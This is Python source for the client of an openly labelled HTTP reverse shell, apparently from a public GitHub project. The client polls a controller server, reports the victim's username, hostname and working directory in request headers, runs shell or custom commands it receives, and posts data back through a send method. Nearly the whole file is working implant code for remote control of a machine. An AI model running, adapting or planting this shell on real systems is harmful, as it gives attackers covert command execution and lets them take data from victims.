#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Basic-HTTP-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import getpass
import http.client
import platform
import re
from urllib import request, parse

from src.client.commands import ClientCommands


class Client:
    def __init__(self,
                 server_address: str,
                 server_port: int):
        self.server_address = server_address
        self.server_port = server_port
        self.hostname = platform.node()
        self.username = getpass.getuser()
        self.commands = ClientCommands(self)

    @property
    def server_url(self) -> str:
        return f"http://{self.server_address}:{self.server_port}"

    def execute(self) -> None:
        while True:
            req = request.Request(url=self.server_url,
                                  headers={
                                      "username": self.username,
                                      "hostname": self.hostname,
                                      "cwd": str(self.commands.get_cwd())
                                  })
            try:
                response: str = request.urlopen(req).read().decode()
            except (http.client.RemoteDisconnected, KeyboardInterrupt):
                break
            command = re.match(r'(?P<cmd>^[a-z]+)\s*(?P<args>.+)*',
                               response,
                               flags=re.IGNORECASE)
            try:
                if command is None:  # "command" is an empty string
                    continue
                # "cmd" is a user-defined command
                getattr(self.commands, command.group("cmd"))(
                    command.group("args"))
            except AttributeError:  # "cmd" is a standard shell command
                self.commands.shell([arg for arg in command.groups() if arg
                                     is not None])

    def send(self, data: [str, bytes], url: str = None) -> None:
        url = self.server_url if url is None else url
        data: bytes = parse.urlencode({"contents": data}).encode()
        req = request.Request(url, data=data)
        request.urlopen(req)


if __name__ == "__main__":
    SERVER_ADDRESS = "localhost"
    SERVER_PORT = 8080

    Client(SERVER_ADDRESS, SERVER_PORT).execute()
